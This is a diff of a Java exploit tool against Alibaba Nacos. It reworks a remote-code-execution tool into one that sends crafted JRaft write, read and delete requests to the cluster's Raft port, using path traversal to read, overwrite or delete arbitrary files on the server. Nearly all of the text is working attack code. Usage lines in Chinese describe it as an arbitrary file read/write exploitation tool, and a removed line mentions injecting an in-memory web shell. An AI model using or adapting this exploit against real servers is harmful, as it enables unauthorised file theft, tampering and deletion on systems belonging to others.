@@ -1,7 +1,6 @@
 package com.nacostools.rce;
 
-
-import com.alibaba.nacos.common.utils.JacksonUtils;
+import com.alibaba.nacos.consistency.entity.ReadRequest;
 import com.alibaba.nacos.consistency.entity.WriteRequest;
 import com.alibaba.nacos.naming.consistency.persistent.impl.BatchWriteRequest;
 import com.alipay.sofa.jraft.RouteTable;
@@ -18,10 +17,12 @@ import java.io.*;
 import java.lang.reflect.Field;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.util.Arrays;
+import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
 
 
-public class NacosRce {
+public class NacosFileReadWrite {
     public static String isWrite = "";
 
     public static void main(String[] args) throws Exception {
@@ -30,8 +31,8 @@ public class NacosRce {
         String jraftPort = "";
         String jraftAddr = "";
 
-//示例	java -jar NacosRce.jar http://192.168.90.1:8848  7848 write
-        if (args.length != 2 && args.length != 3) {
+//示例	java -jar NacosFileReadWrite.jar http://192.168.90.1:8848 7848 write ../../../../../../tmp/test.txt testttt
+        if (args.length != 4 && args.length != 5) {
             printUsage();
             System.exit(0);
         }else {
@@ -39,16 +40,14 @@ public class NacosRce {
             jraftPort = args[1];
             jraftAddr = urlAddr.getHost()+":"+jraftPort;
             isWrite = args[2].trim();
-//            if (args.length == 4){
-//                HessianPayload.os = args[3];
-//            }
+
 
         }
 
         if (isWrite.contentEquals("write"))
         {
-            String FilePath="../../../../../../../../../../tmp/test.txt";
-            String Content="tessssss";
+            String FilePath=args[3].trim();
+            String Content=args[4].trim();
 
             byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
             byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);
@@ -56,32 +55,43 @@ public class NacosRce {
             BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
             batchWriteRequest.append(FileBytes,ContentBytes);
 
-//            ByteArrayOutputStream baos0 = getByteArrayOutputStream(batchWriteRequest);
-//            使用的是jack反序列化，不是hessian
+            byte[] json= JacksonSerializer.serialize(batchWriteRequest);
+
+            try {
+                sendWritePayload(jraftAddr,json);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+        else if (isWrite.equals("delete"))
+        {
+            String FilePath=args[3].trim();
+            String Content="tessssss";//删文件内容不管是啥都行
+
+            byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
+            byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);
+
+            BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
+            batchWriteRequest.append(FileBytes,ContentBytes);
 
             byte[] json= JacksonSerializer.serialize(batchWriteRequest);
 
             try {
-                sendPayload(jraftAddr,json);
+                sendWritePayload(jraftAddr,json);
             }catch (Exception e){
                 e.printStackTrace();
             }
         }
         else if (isWrite.equals("read"))
         {
-            String FilePath="../../../../../../../../../../tmp/test.txt";
-            String Content="tessssss";//读文件内容不管是啥都行
+            String FilePath=args[3].trim();
 
-            byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
-            byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);
+            List byteArrayList = Arrays.asList(FilePath.getBytes());
 
-            BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
-            batchWriteRequest.append(FileBytes,ContentBytes);
-
-            byte[] json= JacksonSerializer.serialize(batchWriteRequest);
+            byte[] json= JacksonSerializer.serialize(byteArrayList);
 
             try {
-                sendPayload(jraftAddr,json);
+                sendReadPayload(jraftAddr,json);
             }catch (Exception e){
                 e.printStackTrace();
             }
@@ -90,14 +100,10 @@ public class NacosRce {
     }
 
 
-
-
     private static ByteArrayOutputStream getByteArrayOutputStream(Object obj) throws IOException {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         Hessian2Output output = new Hessian2Output(baos);
-
 //        output.getSerializerFactory().setAllowNonSerializable(true);
-
         try {
             SerializerFactory serializerFactory = output.getSerializerFactory();
             serializerFactory.setAllowNonSerializable(true);
@@ -110,7 +116,40 @@ public class NacosRce {
         return baos;
     }
 
-    public static void sendPayload(String addr,byte[] payload) throws Exception{
+    public static void sendReadPayload(String addr,byte[] payload) throws Exception{
+
+        //节点标识信息
+        //发请求
+        Configuration conf = new Configuration();
+        conf.parse(addr);
+        RouteTable.getInstance().updateConfiguration("nacos", conf);
+        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
+        cliClientService.init(new CliOptions());
+        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
+        PeerId leader = PeerId.parsePeer(addr);
+
+        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
+        parserClasses.setAccessible(true);
+        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
+        map.put("com.alibaba.nacos.consistency.entity.ReadRequest", ReadRequest.getDefaultInstance());
+        MarshallerHelper.registerRespInstance(ReadRequest .class.getName(), ReadRequest.getDefaultInstance());
+
+        //payload绑定到ReadRequest中
+        //group为naming_persistent_service
+        final ReadRequest  readRequest = ReadRequest.newBuilder().setGroup("naming_persistent_service").setData(ByteString.copyFrom(payload)).build();
+
+        /*
+        任意文件读取走的是com.alibaba.nacos.naming.consistency.persistent.impl.BasePersistentServiceProcessor#onRequest
+        ReadRequest和WriteRequest在com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply中选择调用onApply还是onRequest
+         */
+
+         //发送
+        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), readRequest, 5000);
+        System.out.println(o.toString());
+
+    }
+
+    public static void sendWritePayload(String addr,byte[] payload) throws Exception{
 
         //节点标识信息
         //发请求
@@ -137,22 +176,23 @@ public class NacosRce {
         field.setAccessible(true);
         if (isWrite.equals("write"))
             field.set(writeRequest,"Write");
-        else if (isWrite.equals("read"))
-            field.set(writeRequest,"Read");
+        else if (isWrite.equals("delete"))
+            field.set(writeRequest,"Delete");
 
-         //发送
+        //发送
         Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
         System.out.println(o.toString());
 
     }
+
+
     private static void printUsage() {
         System.err.println("Nacos 任意文件读写 漏洞利用工具");
         System.err.println("** 食用方式 **");
-        System.err.println("自动注入内存马并执行命令\tjava -jar NacosRce.jar Url Jraft端口 ");
-        System.err.println("示例\tjava -jar NacosRce.jar http://192.168.90.1:8848/nacos  7848 \"write\" ");
+        System.err.println("示例\tjava -jar NacosFileReadWrite.jar http://192.168.90.1:8848/ 7848 write ../../../../../../tmp/test.txt 12341123413");
+        System.err.println("示例\tjava -jar NacosFileReadWrite.jar http://192.168.90.1:8848/ 7848 read ../../../../../../tmp/test.txt");
+        System.err.println("示例\tjava -jar NacosFileReadWrite.jar http://192.168.90.1:8848/ 7848 delete ../../../../../../tmp/test.txt");
         System.err.println();
-
-
     }
 
 }
